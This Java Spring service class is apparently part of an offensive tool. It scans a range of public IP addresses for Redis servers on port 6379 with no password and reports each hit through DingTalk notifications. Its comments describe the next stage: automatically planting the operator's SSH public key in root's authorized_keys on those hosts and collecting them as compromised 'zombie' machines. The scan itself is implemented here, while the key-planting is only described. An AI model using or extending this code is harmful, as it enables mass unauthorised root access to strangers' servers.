package com.aoshiguchen.loophole.service;

import com.aoshiguchen.loophole.base.BaseLoopholeScanService;
import com.aoshiguchen.loophole.base.SystemConfig;
import com.aoshiguchen.loophole.core.foundation.Foundation;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

/**
 * redis漏洞扫描服务
 * Author: yangwen
 * Date:  2019/6/2
 */
@Slf4j
@Service
public class RedisLoopholeScanService implements BaseLoopholeScanService {

    @Autowired
    private DingService dingService;

    /**
     * 扫描指定范围的公网ip，发现有暴露redis默认端口且未设置认证密码的ip，保存入文件当中，并且发送钉钉通知
     * 然后自动执行脚本，一键将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里
     * 保存所有的肉鸡ip，并发送钉钉通知
     * Author: yangwen
     * Date:  2019/5/29
     */
    public void scan(){
        Foundation.ipv4().ergodicPublicNetworkIp(SystemConfig.SCAN_FROM_IP,SystemConfig.SCAN_TO_IP, // 设置扫描ip段
            ipv4 ->  Foundation.redis().check(ipv4.getString()), // 过滤暴露6379外网端口的ip
            (ipv4,progress) -> log.info(progress + "%")    // 输出扫描进度
            ,ipv4 -> {
                log.info("扫描到redis漏洞ip:" + ipv4);
                dingService.notice(ipv4.getString());
            });
    }

}
